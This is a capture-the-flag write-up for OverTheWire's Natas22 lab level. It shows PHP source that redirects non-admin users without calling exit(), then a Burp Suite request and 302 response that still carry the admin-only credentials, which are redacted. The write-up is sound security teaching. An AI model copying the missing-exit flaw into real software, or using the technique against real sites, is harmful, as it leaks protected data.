# Natas22
#natas #logic #burp-suite 
## Vulnerability:
Missing `exit()` statement after redirecting a non admin user, causing the script to continue executing and exposing sensitive data in the HTTP response.
## Technique:
#### Steps:
###### 1) Analyzing the source code
**Source Code:**
```php
<?php
session_start();

if (array_key_exists("revelio", $_GET)) {
    // Only admins can reveal the password
    if (!($_SESSION 
          && array_key_exists("admin", $_SESSION) 
          && $_SESSION["admin"] == 1)){
        
        header("Location: /");
    }
}
?>
```
```html  
<html>
<head>
    <!-- This stuff in the header has nothing to do with the level -->

    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />

    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>

    <script>
        var wechallinfo = {
            "level": "natas22",
            "pass": "<censored>"
        };
    </script>
</head>

<body>
    <h1>natas22</h1>

    <div id="content">
```
```php  
<?php
if (array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
}
?>
```
```html  
<div id="viewsource">
    <a href="index-source.html">View sourcecode</a>
</div>

</div>
</body>
</html>
```
After starting the session, the code checks whether the `revelio` parameter exists in the URL. If it does, it verifies whether the user is an administrator. If the user is not an administrator, the application redirects them to the home page.

But the code doesn't call `exit()` after `header("Location: /")`. Since `header()` only sends an HTTP redirect header and does not stop script execution, the remaining code is still executed.
###### 2) Exploiting the vulnerability
We sent a request containing the `revelio` parameter using Burp Suite to inspect the HTTP response, since the browser automatically followed the redirect and did not display the original response body.

**Request:**
```http
GET /?revelio HTTP/1.1
Host: natas22.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: <REDACTED>
Connection: keep-alive
```
**Response:**
```http
HTTP/1.1 302 Found
Date: Fri, 07 Aug 2026 15:58:01 GMT
Server: Apache/2.4.66 (Ubuntu)
Set-Cookie: PHPSESSID=6bb4ai5bm6816joi84f43ghi5r; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /
Content-Length: 1028
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```
```html
<html>
<head>
    <!-- This stuff in the header has nothing to do with the level -->

    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />

    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>

    <script>
        var wechallinfo = {
            "level": "natas22",
            "pass": <NATAS21_PASSWORD>
        };
    </script>
</head>

<body>
    <h1>natas22</h1>

    <div id="content">
        You are an admin. The credentials for the next level are:<br>

        <pre>Username: natas23
Password: <PASSWORD></pre>

        <div id="viewsource">
            <a href="index-source.html">View sourcecode</a>
        </div>
    </div>
</body>
</html>
```
`302 Found` response code status indicates that the requested resource has been temporarily redirected to another URL.
## Password found:
[Not disclosed — solve it yourself!]
## Previous Level: 
[Natas21](./Natas21.md)
## Next Level:
[Natas23](./Natas23.md)
